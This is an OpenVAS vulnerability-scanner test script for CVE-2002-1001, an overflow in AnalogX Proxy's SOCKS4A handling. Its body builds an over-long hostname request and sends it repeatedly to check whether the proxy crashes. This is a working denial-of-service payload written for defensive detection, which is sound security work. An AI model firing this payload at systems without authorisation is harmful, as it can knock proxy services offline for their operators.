###############################################################################
# OpenVAS Vulnerability Test
# $Id: socks4a_hostname_overflow.nasl 5252 2017-02-09 16:34:10Z cfi $
#
# SOCKS4A hostname overflow
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID and CAN
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# References:
# Subject: Foundstone Advisory - Buffer Overflow in AnalogX Proxy
# Date: Mon, 1 Jul 2002 14:37:44 -0700
# From: "Foundstone Labs" <labs@foundstone.com>
# To: <da@securityfocus.com>
#
# Socks4a extension is described on 
# http://www.socks.nec.com/protocol/socks4a.protocol
#
# Vulnerable:
# AnalogX Proxy v4.07 and previous

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11126");
  script_version("$Revision: 5252 $");
  script_tag(name:"last_modification", value:"$Date: 2017-02-09 17:34:10 +0100 (Thu, 09 Feb 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(5138, 5139);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2002-1001");
  script_name("SOCKS4A hostname overflow");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2002 Michel Arboi");
  script_family("Gain a shell remotely");
  script_dependencies("socks.nasl");
  script_require_ports("Services/socks4", 1080);
  script_mandatory_keys("socks4/detected");

  tag_summary = "It was possible to kill the remote SOCKS4A server by
  sending a request with a too long hostname.";

  tag_impact = "A cracker may exploit this vulnerability to make your SOCKS server
  crash continually or even execute arbitrary code on your system.";

  tag_solution = "Upgrade your software";

  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"solution", value:tag_solution);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");

port = get_kb_item("Services/socks4");
if(!port) port = 1080;
if(! get_port_state(port)) exit(0);

soc = open_sock_tcp(port);
if(! soc) exit(0);

hlen = 512;	# 140 bytes are enough for AnalogX
# Connect to hostname on port 8080 (= 31*256+4)
cnx = raw_string(4, 1, 4, 31, 0, 0, 0, 1) + "openvas" + raw_string(0) 
	+ crap(hlen) + raw_string(0);

for (i=0; i < 6; i=i+1)
{
 send(socket: soc, data: cnx);
 r = recv(socket: soc, length: 8, timeout:1);
 close(soc);
 soc = open_sock_tcp(port);
 if(! soc) { security_message(port);  exit(0); }
}

close(soc);
